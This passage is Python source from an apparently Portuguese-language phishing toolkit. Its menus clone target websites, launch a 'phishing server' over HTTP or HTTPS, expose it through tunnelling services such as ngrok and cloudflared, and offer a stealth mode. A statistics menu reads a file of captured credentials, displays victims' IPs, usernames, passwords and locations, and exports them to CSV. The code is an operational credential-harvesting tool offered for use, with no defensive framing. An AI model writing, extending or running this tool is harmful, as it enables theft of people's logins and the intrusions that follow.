        current_service = config.get('tunnel_service', 'ngrok')
        
        print(f"""{ui.PURPLE}
╔══════════════════════════════════════════════════════════╗
║{ui.CYAN}               SELECIONAR SERVIÇO DE TUNELAMENTO    {ui.PURPLE}║
╠══════════════════════════════════════════════════════════╣
║ {ui.WHITE}1. {ui.GREEN}Ngrok {'(Atual)' if current_service == 'ngrok' else ''}            {ui.PURPLE}║
║ {ui.WHITE}2. {ui.GREEN}Serveo {'(Atual)' if current_service == 'serveo' else ''}          {ui.PURPLE}║
║ {ui.WHITE}3. {ui.GREEN}LocalTunnel {'(Atual)' if current_service == 'localtunnel' else ''}{ui.PURPLE}║
║ {ui.WHITE}4. {ui.GREEN}Cloudflared {'(Atual)' if current_service == 'cloudflared' else ''}{ui.PURPLE}║
║ {ui.WHITE}5. {ui.GREEN}PageKite {'(Atual)' if current_service == 'pagekite' else ''}      {ui.PURPLE}║
║ {ui.WHITE}6. {ui.BLUE}Voltar                                {ui.PURPLE}║
╚══════════════════════════════════════════════════════════╝{ui.END}""")

        choice = input(f"\n{ui.YELLOW}[?] Selecione um serviço (1-6): {ui.END}")
        
        services = {
            '1': 'ngrok',
            '2': 'serveo',
            '3': 'localtunnel',
            '4': 'cloudflared',
            '5': 'pagekite'
        }
        
        if choice in services:
            config.set('tunnel_service', services[choice])
            print(f"{ui.GREEN}[+] Serviço de tunelamento definido como {services[choice].upper()}{ui.END}")
            time.sleep(1)
            self.display_menu("tunnel")
        elif choice == '6':
            self.display_menu("tunnel")
        else:
            print(f"\n{ui.RED}[-] Opção inválida!{ui.END}")
            time.sleep(1)
            self.select_tunnel_service()
    
    def configure_tunnel_region(self):
        self.clear_screen()
        current_region = config.get('tunnel_region', 'us')
        service = config.get('tunnel_service', 'ngrok')
        
        if service != 'ngrok':
            print(f"{ui.YELLOW}[-] Configuração de região só está disponível para Ngrok{ui.END}")
            time.sleep(2)
            self.display_menu("tunnel")
            return
            
        regions = {
            '1': 'us',
            '2': 'eu',
            '3': 'ap',
            '4': 'au',
            '5': 'sa',
            '6': 'jp',
            '7': 'in'
        }
        
        print(f"""{ui.PURPLE}
╔══════════════════════════════════════════════════════════╗
║{ui.CYAN}               CONFIGURAR REGIÃO DO NGROK           {ui.PURPLE}║
╠══════════════════════════════════════════════════════════╣
║ {ui.WHITE}Região Atual: {ui.GREEN}{current_region.upper()}                          {ui.PURPLE}║
╠══════════════════════════════════════════════════════════╣
║ {ui.WHITE}1. {ui.GREEN}EUA (us) {'(Atual)' if current_region == 'us' else ''}      {ui.PURPLE}║
║ {ui.WHITE}2. {ui.GREEN}Europa (eu) {'(Atual)' if current_region == 'eu' else ''}   {ui.PURPLE}║
║ {ui.WHITE}3. {ui.GREEN}Ásia/Pacífico (ap) {'(Atual)' if current_region == 'ap' else ''}{ui.PURPLE}║
║ {ui.WHITE}4. {ui.GREEN}Austrália (au) {'(Atual)' if current_region == 'au' else ''}{ui.PURPLE}║
║ {ui.WHITE}5. {ui.GREEN}América do Sul (sa) {'(Atual)' if current_region == 'sa' else ''}{ui.PURPLE}║
║ {ui.WHITE}6. {ui.GREEN}Japão (jp) {'(Atual)' if current_region == 'jp' else ''}    {ui.PURPLE}║
║ {ui.WHITE}7. {ui.GREEN}Índia (in) {'(Atual)' if current_region == 'in' else ''}    {ui.PURPLE}║
║ {ui.WHITE}8. {ui.BLUE}Voltar                                {ui.PURPLE}║
╚══════════════════════════════════════════════════════════╝{ui.END}""")

        choice = input(f"\n{ui.YELLOW}[?] Selecione uma região (1-8): {ui.END}")
        
        if choice in regions:
            config.set('tunnel_region', regions[choice])
            print(f"{ui.GREEN}[+] Região definida como {regions[choice].upper()}{ui.END}")
            time.sleep(1)
            self.display_menu("tunnel")
        elif choice == '8':
            self.display_menu("tunnel")
        else:
            print(f"\n{ui.RED}[-] Opção inválida!{ui.END}")
            time.sleep(1)
            self.configure_tunnel_region()
    
    def install_tunnel_tools(self):
        self.clear_screen()
        print(f"""{ui.PURPLE}
╔══════════════════════════════════════════════════════════╗
║{ui.CYAN}               INSTALAR FERRAMENTAS DE TUNELAMENTO  {ui.PURPLE}║
╠══════════════════════════════════════════════════════════╣
║ {ui.WHITE}1. {ui.GREEN}Instalar Ngrok                           {ui.PURPLE}║
║ {ui.WHITE}2. {ui.GREEN}Instalar Cloudflared                     {ui.PURPLE}║
║ {ui.WHITE}3. {ui.GREEN}Instalar PageKite                        {ui.PURPLE}║
║ {ui.WHITE}4. {ui.GREEN}Instalar LocalTunnel (via npm)           {ui.PURPLE}║
║ {ui.WHITE}5. {ui.GREEN}Instalar Todas                           {ui.PURPLE}║
║ {ui.WHITE}6. {ui.BLUE}Voltar                                    {ui.PURPLE}║
╚══════════════════════════════════════════════════════════╝{ui.END}""")

        choice = input(f"\n{ui.YELLOW}[?] Selecione uma opção (1-6): {ui.END}")
        
        if choice == '1':
            self.tunnel_manager.install_tunnel_service('ngrok')
            input(f"\n{ui.CYAN}[*] Pressione Enter para continuar...{ui.END}")
            self.install_tunnel_tools()
        elif choice == '2':
            self.tunnel_manager.install_tunnel_service('cloudflared')
            input(f"\n{ui.CYAN}[*] Pressione Enter para continuar...{ui.END}")
            self.install_tunnel_tools()
        elif choice == '3':
            self.tunnel_manager.install_tunnel_service('pagekite')
            input(f"\n{ui.CYAN}[*] Pressione Enter para continuar...{ui.END}")
            self.install_tunnel_tools()
        elif choice == '4':
            self.tunnel_manager.install_tunnel_service('localtunnel')
            input(f"\n{ui.CYAN}[*] Pressione Enter para continuar...{ui.END}")
            self.install_tunnel_tools()
        elif choice == '5':
            for service in ['ngrok', 'cloudflared', 'pagekite', 'localtunnel']:
                self.tunnel_manager.install_tunnel_service(service)
            input(f"\n{ui.CYAN}[*] Pressione Enter para continuar...{ui.END}")
            self.install_tunnel_tools()
        elif choice == '6':
            self.display_menu("tunnel")
        else:
            print(f"\n{ui.RED}[-] Opção inválida!{ui.END}")
            time.sleep(1)
            self.install_tunnel_tools()
    
    def test_tunnel(self):
        self.clear_screen()
        port = input(f"{ui.YELLOW}[?] Digite a porta local para tunelamento (ex: 8080): {ui.END}")
        
        try:
            port = int(port)
            if not (1 <= port <= 65535):
                raise ValueError
                
            print(f"{ui.YELLOW}[*] Iniciando teste de tunelamento...{ui.END}")
            url = self.tunnel_manager.start_tunnel(port)
            
            if url:
                print(f"{ui.GREEN}[+] Tunelamento estabelecido com sucesso!{ui.END}")
                print(f"{ui.CYAN}[*] URL: {url}{ui.END}")
                
                if input(f"{ui.YELLOW}[?] Abrir no navegador? (s/n): {ui.END}").lower() == 's':
                    webbrowser.open(url)
                    
                input(f"\n{ui.CYAN}[*] Pressione Enter para parar o tunelamento...{ui.END}")
                self.tunnel_manager.stop_tunnel()
            else:
                print(f"{ui.RED}[-] Falha ao estabelecer tunelamento{ui.END}")
                
        except ValueError:
            print(f"{ui.RED}[-] Porta inválida! Deve ser entre 1 e 65535{ui.END}")
        
        input(f"\n{ui.CYAN}[*] Pressione Enter para continuar...{ui.END}")
        self.display_menu("tunnel")
            
    def clone_menu(self):
        self.clear_screen()
        print(f"""{ui.PURPLE}
╔══════════════════════════════════════════════════════════╗
║{ui.CYAN}               CLONAGEM DE SITES                   {ui.PURPLE}║
╠══════════════════════════════════════════════════════════╣
║ {ui.WHITE}1. {ui.GREEN}Clonar Site Simples                         {ui.PURPLE}║
║ {ui.WHITE}2. {ui.GREEN}Clonagem Profunda (recursiva)               {ui.PURPLE}║
║ {ui.WHITE}3. {ui.GREEN}Clonar e Iniciar Servidor Automático         {ui.PURPLE}║
║ {ui.WHITE}4. {ui.BLUE}Voltar ao Menu Principal                     {ui.PURPLE}║
╚══════════════════════════════════════════════════════════╝{ui.END}""")

        choice = input(f"\n{ui.YELLOW}[?] Selecione uma opção (1-4): {ui.END}")
        
        if choice == '1':
            url = input(f"{ui.YELLOW}[?] Digite a URL do site para clonar: {ui.END}")
            cloner = SiteCloner(url, depth=1)
            cloner.clone_site()
            input(f"\n{ui.CYAN}[*] Pressione Enter para continuar...{ui.END}")
            self.display_menu("clone")
        elif choice == '2':
            url = input(f"{ui.YELLOW}[?] Digite a URL do site para clonar: {ui.END}")
            depth = input(f"{ui.YELLOW}[?] Profundidade de clonagem (1-3): {ui.END}")
            try:
                depth = max(1, min(3, int(depth)))
                cloner = SiteCloner(url, depth=depth)
                cloner.clone_site()
                input(f"\n{ui.CYAN}[*] Pressione Enter para continuar...{ui.END}")
            except ValueError:
                print(f"{ui.RED}[-] Profundidade inválida!{ui.END}")
                time.sleep(1)
            self.display_menu("clone")
        elif choice == '3':
            url = input(f"{ui.YELLOW}[?] Digite a URL do site para clonar: {ui.END}")
            port = input(f"{ui.YELLOW}[?] Porta do servidor (padrão: 8080): {ui.END}")
            try:
                port = int(port) if port else 8080
                config.set('last_used_port', port)
                
                print(f"{ui.YELLOW}[*] Iniciando clonagem...{ui.END}")
                cloner = SiteCloner(url, depth=2)
                if cloner.clone_site():
                    print(f"{ui.YELLOW}[*] Iniciando servidor...{ui.END}")
                    server = AdvancedPhishingServer(port=port, https=config.get('auto_https', False))
                    server.run()
            except ValueError:
                print(f"{ui.RED}[-] Porta inválida!{ui.END}")
                time.sleep(1)
            self.display_menu("clone")
        elif choice == '4':
            self.display_menu("main")
        else:
            print(f"\n{ui.RED}[-] Opção inválida!{ui.END}")
            time.sleep(1)
            self.display_menu("clone")
            
    def server_menu(self):
        self.clear_screen()
        print(f"""{ui.PURPLE}
╔══════════════════════════════════════════════════════════╗
║{ui.CYAN}               SERVIDOR PHISHING                     {ui.PURPLE}║
╠══════════════════════════════════════════════════════════╣
║ {ui.WHITE}1. {ui.GREEN}Iniciar Servidor HTTP                        {ui.PURPLE}║
║ {ui.WHITE}2. {ui.GREEN}Iniciar Servidor HTTPS                       {ui.PURPLE}║
║ {ui.WHITE}3. {ui.GREEN}Configurar Porta                             {ui.PURPLE}║
║ {ui.WHITE}4. {ui.BLUE}Voltar ao Menu Principal                     {ui.PURPLE}║
╚══════════════════════════════════════════════════════════╝{ui.END}""")

        choice = input(f"\n{ui.YELLOW}[?] Selecione uma opção (1-4): {ui.END}")
        
        if choice == '1':
            port = input(f"{ui.YELLOW}[?] Porta do servidor (padrão: {config.get('last_used_port', 8080)}): {ui.END}")
            try:
                port = int(port) if port else config.get('last_used_port', 8080)
                config.set('last_used_port', port)
                server = AdvancedPhishingServer(port=port, https=False)
                server.run()
            except ValueError:
                print(f"{ui.RED}[-] Porta inválida!{ui.END}")
                time.sleep(1)
            self.display_menu("server")
        elif choice == '2':
            port = input(f"{ui.YELLOW}[?] Porta do servidor (padrão: {config.get('last_used_port', 8080)}): {ui.END}")
            try:
                port = int(port) if port else config.get('last_used_port', 8080)
                config.set('last_used_port', port)
                server = AdvancedPhishingServer(port=port, https=True)
                server.run()
            except ValueError:
                print(f"{ui.RED}[-] Porta inválida!{ui.END}")
                time.sleep(1)
            self.display_menu("server")
        elif choice == '3':
            port = input(f"{ui.YELLOW}[?] Nova porta padrão (atual: {config.get('last_used_port', 8080)}): {ui.END}")
            try:
                port = int(port)
                if 1024 <= port <= 65535:
                    config.set('last_used_port', port)
                    print(f"{ui.GREEN}[+] Porta padrão atualizada para {port}{ui.END}")
                else:
                    print(f"{ui.RED}[-] Porta deve estar entre 1024 e 65535{ui.END}")
            except ValueError:
                print(f"{ui.RED}[-] Porta inválida!{ui.END}")
            time.sleep(1)
            self.display_menu("server")
        elif choice == '4':
            self.display_menu("main")
        else:
            print(f"\n{ui.RED}[-] Opção inválida!{ui.END}")
            time.sleep(1)
            self.display_menu("server")
            
    def settings_menu(self):
        self.clear_screen()
        print(f"""{ui.PURPLE}
╔══════════════════════════════════════════════════════════╗
║{ui.CYAN}               CONFIGURAÇÕES                         {ui.PURPLE}║
╠══════════════════════════════════════════════════════════╣
║ {ui.WHITE}1. {ui.GREEN}Tema ({config.get('theme', 'dark').title()})                    {ui.PURPLE}║
║ {ui.WHITE}2. {ui.GREEN}Modo Furtivo ({'Ativado' if config.get('stealth_mode', False) else 'Desativado'})          {ui.PURPLE}║
║ {ui.WHITE}3. {ui.GREEN}HTTPS Automático ({'Ativado' if config.get('auto_https', True) else 'Desativado'})        {ui.PURPLE}║
║ {ui.WHITE}4. {ui.GREEN}Profundidade de Clonagem ({config.get('clone_depth', 2)})       {ui.PURPLE}║
║ {ui.WHITE}5. {ui.BLUE}Voltar ao Menu Principal                     {ui.PURPLE}║
╚══════════════════════════════════════════════════════════╝{ui.END}""")

        choice = input(f"\n{ui.YELLOW}[?] Selecione uma opção (1-5): {ui.END}")
        
        if choice == '1':
            theme = 'light' if config.get('theme') == 'dark' else 'dark'
            config.set('theme', theme)
            ui.set_theme(theme)
            print(f"{ui.GREEN}[+] Tema alterado para {theme}{ui.END}")
            time.sleep(1)
            self.display_menu("settings")
        elif choice == '2':
            stealth = not config.get('stealth_mode', False)
            config.set('stealth_mode', stealth)
            print(f"{ui.GREEN}[+] Modo furtivo {'ativado' if stealth else 'desativado'}{ui.END}")
            time.sleep(1)
            self.display_menu("settings")
        elif choice == '3':
            auto_https = not config.get('auto_https', True)
            config.set('auto_https', auto_https)
            print(f"{ui.GREEN}[+] HTTPS automático {'ativado' if auto_https else 'desativado'}{ui.END}")
            time.sleep(1)
            self.display_menu("settings")
        elif choice == '4':
            depth = input(f"{ui.YELLOW}[?] Nova profundidade (1-3): {ui.END}")
            try:
                depth = max(1, min(3, int(depth)))
                config.set('clone_depth', depth)
                print(f"{ui.GREEN}[+] Profundidade de clonagem definida para {depth}{ui.END}")
            except ValueError:
                print(f"{ui.RED}[-] Valor inválido!{ui.END}")
            time.sleep(1)
            self.display_menu("settings")
        elif choice == '5':
            self.display_menu("main")
        else:
            print(f"\n{ui.RED}[-] Opção inválida!{ui.END}")
            time.sleep(1)
            self.display_menu("settings")
            
    def stats_menu(self):
        self.clear_screen()
        
        # Verificar se existem credenciais capturadas
        cred_file = "credenciais_capturadas.json"
        if os.path.exists(cred_file):
            with open(cred_file, 'r') as f:
                creds = json.load(f)
            total_creds = len(creds)
            last_cred = creds[-1] if creds else {}
        else:
            total_creds = 0
            last_cred = {}
            
        print(f"""{ui.PURPLE}
╔══════════════════════════════════════════════════════════╗
║{ui.CYAN}               ESTATÍSTICAS                          {ui.PURPLE}║
╠══════════════════════════════════════════════════════════╣
║ {ui.WHITE}Total de Credenciais Capturadas: {ui.GREEN}{total_creds}                  {ui.PURPLE}║""")
        
        if total_creds > 0:
            print(f"""║ {ui.WHITE}Último Acesso:                          {ui.PURPLE}║
║ {ui.YELLOW}IP: {last_cred.get('ip', 'N/A')}                    {ui.PURPLE}║
║ {ui.YELLOW}Usuário: {last_cred.get('username', 'N/A')}               {ui.PURPLE}║
║ {ui.YELLOW}Senha: {last_cred.get('password', 'N/A')}                {ui.PURPLE}║""")
        
        print(f"""║                                                  ║
║ {ui.WHITE}1. {ui.GREEN}Ver Todas Credenciais                     {ui.PURPLE}║
║ {ui.WHITE}2. {ui.GREEN}Exportar para CSV                        {ui.PURPLE}║
║ {ui.WHITE}3. {ui.GREEN}Limpar Dados                             {ui.PURPLE}║
║ {ui.WHITE}4. {ui.BLUE}Voltar ao Menu Principal                  {ui.PURPLE}║
╚══════════════════════════════════════════════════════════╝{ui.END}""")

        choice = input(f"\n{ui.YELLOW}[?] Selecione uma opção (1-4): {ui.END}")
        
        if choice == '1' and total_creds > 0:
            self.clear_screen()
            print(f"{ui.CYAN}\n=== Credenciais Capturadas ==={ui.END}")
            for i, cred in enumerate(creds, 1):
                print(f"\n{ui.WHITE}{i}. {ui.YELLOW}IP: {cred.get('ip')}")
                print(f"{ui.WHITE}   Timestamp: {cred.get('timestamp')}")
                print(f"{ui.WHITE}   User Agent: {cred.get('user_agent', 'N/A')}")
                if 'geolocation' in cred:
                    print(f"{ui.WHITE}   Localização: {cred['geolocation'].get('city', 'N/A')}, {cred['geolocation'].get('country', 'N/A')}")
                for k, v in cred.items():
                    if k not in ['ip', 'timestamp', 'user_agent', 'geolocation']:
                        print(f"{ui.WHITE}   {k}: {ui.RED}{v}{ui.END}")
            input(f"\n{ui.CYAN}[*] Pressione Enter para continuar...{ui.END}")
            self.display_menu("stats")
        elif choice == '2' and total_creds > 0:
            csv_file = "credenciais_exportadas.csv"
            try:
                with open(csv_file, 'w') as f:
                    f.write("Timestamp,IP,Username,Password,User Agent,Location\n")
                    for cred in creds:
                        loc = f"{cred.get('geolocation', {}).get('city', 'N/A')}, {cred.get('geolocation', {}).get('country', 'N/A')}" if 'geolocation' in cred else 'N/A'
                        f.write(f"{cred.get('timestamp')},{cred.get('ip')},{cred.get('username', '')},{cred.get('password', '')},{cred.get('user_agent', '').replace(',', ';')},{loc}\n")
                print(f"{ui.GREEN}[+] Credenciais exportadas para {csv_file}{ui.END}")
            except Exception as e:
                print(f"{ui.RED}[-] Erro ao exportar: {str(e)}{ui.END}")
            time.sleep(2)
            self.display_menu("stats")
        elif choice == '3':
            if os.path.exists(cred_file):
                os.remove(cred_file)
                print(f"{ui.GREEN}[+] Dados de credenciais removidos{ui.END}")
            else:
                print(f"{ui.YELLOW}[-] Nenhum dado para remover{ui.END}")
            time.sleep(1)
            self.display_menu("stats")
        elif choice == '4':
            self.display_menu("main")
        else:
            print(f"\n{ui.RED}[-] Opção inválida ou nenhum dado disponível!{ui.END}")
            time.sleep(1)
            self.display_menu("stats")

# Inicialização
if __name__ == '__main__':
    try:
        # Verificar dependências
        try:
            import bs4
            import cryptography
        except ImportError:
            print(f"{ui.RED}[!] Instalando dependências necessárias...{ui.END}")
            subprocess.run([sys.executable, "-m", "pip", "install", "beautifulsoup4", "cryptography", "geoip2"])
            print(f"{ui.GREEN}[+] Dependências instaladas com sucesso!{ui.END}")
            time.sleep(2)
            
        # Iniciar sistema de menus
        menu = MenuSystem()
        menu.display_menu("main")
        
    except KeyboardInterrupt:
        print(f"\n{ui.RED}[!] Programa interrompido pelo usuário.{ui.END}")
        sys.exit()
    except Exception as e:
        print(f"\n{ui.RED}[!] Erro crítico: {str(e)}{ui.END}")
        sys.exit(1)
